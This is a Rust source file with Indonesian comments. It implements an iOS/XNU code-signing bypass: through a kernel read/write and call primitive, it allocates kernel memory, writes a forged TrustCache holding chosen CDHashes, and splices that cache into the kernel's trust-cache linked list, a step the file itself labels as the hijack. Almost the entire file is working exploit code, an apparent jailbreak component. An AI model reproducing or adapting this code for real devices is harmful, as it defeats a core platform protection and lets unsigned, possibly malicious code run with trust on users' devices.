#![no_std]

use crate::evolution::kcall_primitive::KCallManager;

// --- DEFINISI STRUKTUR TRUSTCACHE (XNU INTERNALS) ---

// Ukuran CDHash standar Apple (SHA-256 yang dipotong)
const CS_CDHASH_LEN: usize = 20;

#[repr(C, packed)]
pub struct TrustCacheEntry {
    pub cdhash: [u8; CS_CDHASH_LEN],
    pub hash_type: u8,
    pub flags: u8,
}

#[repr(C, packed)]
pub struct TrustCache {
    pub version: u32,
    pub uuid: [u8; 16],
    pub num_entries: u32,
    // Diikuti oleh array TrustCacheEntry secara dinamis di memori
}

// Node Linked List yang mengikat berbagai TrustCache
#[repr(C)]
pub struct TrustCacheModule {
    pub next_ptr: u64, // Pointer ke modul berikutnya
    pub prev_ptr: u64,
    pub cache_ptr: u64, // Pointer ke struct TrustCache
    pub added_by_us: u32,
}

pub struct CsBypasser {
    // Alamat kepala (head) dari dynamic TrustCache linked list
    // Biasanya ini diekstrak dari fungsi 'pmap_image4_trust_caches' via HeuristicScanner
    trust_cache_list_head: u64, 
}

impl CsBypasser {
    pub fn new(tc_head_addr: u64) -> Self {
        CsBypasser {
            trust_cache_list_head: tc_head_addr,
        }
    }

    /// FUNGSI UTAMA: Menginjeksi array CDHash ke dalam Kernel
    pub fn inject_cdhashes(&self, kcall: &mut KCallManager, hashes: &[[u8; CS_CDHASH_LEN]]) -> Result<(), &'static str> {
        if hashes.is_empty() {
            return Err("Daftar hash kosong.");
        }

        let num_hashes = hashes.len() as u32;
        let tc_size = core::mem::size_of::<TrustCache>() + (hashes.len() * core::mem::size_of::<TrustCacheEntry>());
        let module_size = core::mem::size_of::<TrustCacheModule>();

        // 1. ALOKASI MEMORI KERNEL (via kcall kalloc)
        // Kita butuh memori untuk modul linked list dan memori untuk daftar hash.
        let alloc_addr = match kcall.kalloc(tc_size as u64 + module_size as u64) {
            Some(addr) => addr,
            None => return Err("KALLOC_FAIL: Gagal mengalokasikan memori TrustCache"),
        };

        let tc_ptr = alloc_addr;
        let module_ptr = alloc_addr + tc_size as u64;

        // 2. PENYUSUNAN PAYLOAD DI MEMORI
        // Kita merakit header TrustCache
        let mut tc_header = TrustCache {
            version: 1,
            uuid: [0x4A, 0x49, 0x4C, 0x5F, 0x54, 0x43, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00], // "JIL_TC"
            num_entries: num_hashes,
        };
        kcall.kwrite_struct(tc_ptr, &tc_header);

        // Menulis setiap entri hash tepat setelah header
        let mut entry_addr = tc_ptr + core::mem::size_of::<TrustCache>() as u64;
        for hash in hashes {
            let entry = TrustCacheEntry {
                cdhash: *hash,
                hash_type: 2, // 2 = SHA-256 (Standar modern iOS)
                flags: 0,
            };
            kcall.kwrite_struct(entry_addr, &entry);
            entry_addr += core::mem::size_of::<TrustCacheEntry>() as u64;
        }

        // 3. PENYUSUNAN MODULE LINKED LIST
        // BUG-04 FIX: kread butuh buffer [u8; 8], bukan slice dari u64
        let mut raw_head_next = [0u8; 8];
        kcall.kread(self.trust_cache_list_head, &mut raw_head_next);
        let prev_head_next = u64::from_le_bytes(raw_head_next);

        let module = TrustCacheModule {
            next_ptr: prev_head_next,
            prev_ptr: self.trust_cache_list_head,
            cache_ptr: tc_ptr,
            added_by_us: 1,
        };
        kcall.kwrite_struct(module_ptr, &module);

        // 4. THE HIJACK (Operasi Kritis: Menautkan modul kita ke sistem kernel)
        // PERINGATAN: Di sinilah PPL (Page Protection Layer) biasanya menyerang.
        let write_result = kcall.kwrite64(self.trust_cache_list_head, module_ptr);
        
        if write_result.is_err() {
            return Err("PPL_BLOCK: Gagal menulis ke TrustCache List Head.");
        }

        Ok(())
    }
}